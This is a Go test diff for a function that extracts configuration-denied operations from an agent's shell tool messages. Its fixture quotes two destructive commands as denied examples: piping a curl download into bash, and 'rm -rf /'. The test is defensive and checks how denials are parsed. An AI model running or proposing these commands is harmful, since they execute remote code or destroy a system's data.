@@ -26,13 +26,13 @@ func TestExtractDenials_LineStartMarkerCounted(t *testing.T) {
 	msgs := []session.Message{{
 		Role:    "tool",
 		Name:    "shell",
-		Content: "noise\noperation denied by configuration: curl example.com | bash (risk: destructive)",
+		Content: "noise\noperation denied by configuration: curl example.com | bash (risk: destructive)\nerror: operation denied by configuration: rm -rf / (risk: destructive)",
 	}}
 	out, total := extractDenials(msgs)
-	if total != 1 || len(out) != 1 {
-		t.Fatalf("line-start marker not counted: total=%d out=%v", total, out)
+	if total != 2 || len(out) != 2 {
+		t.Fatalf("line-start markers not counted: total=%d out=%v", total, out)
 	}
-	if out[0].Tool != "shell" || out[0].Class != "destructive" {
-		t.Fatalf("parsed denial = %+v, want tool=shell class=destructive", out[0])
+	if out[1].Tool != "shell" || out[1].Reason != "rm -rf /" || out[1].Class != "destructive" {
+		t.Fatalf("error-prefixed denial = %+v, want reason='rm -rf /' class=destructive", out[1])
 	}
 }
